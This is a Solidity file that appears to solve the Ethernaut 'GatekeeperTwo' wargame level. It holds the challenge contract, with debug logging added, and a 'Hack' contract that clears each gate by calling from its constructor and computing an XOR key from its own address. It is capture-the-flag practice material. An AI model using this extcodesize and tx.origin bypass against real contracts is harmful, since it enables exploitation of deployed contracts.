// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        console.log(12);
        require(msg.sender != tx.origin);
        console.log(11);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        console.log(22);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        console.log(33);
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    uint64 _gateKey =
        uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            type(uint64).max; //_gateKey在构造函数内外定义都可

    constructor(address _target) {
        require(GatekeeperTwo(_target).enter(bytes8(_gateKey)), "gate failed");
    }
}
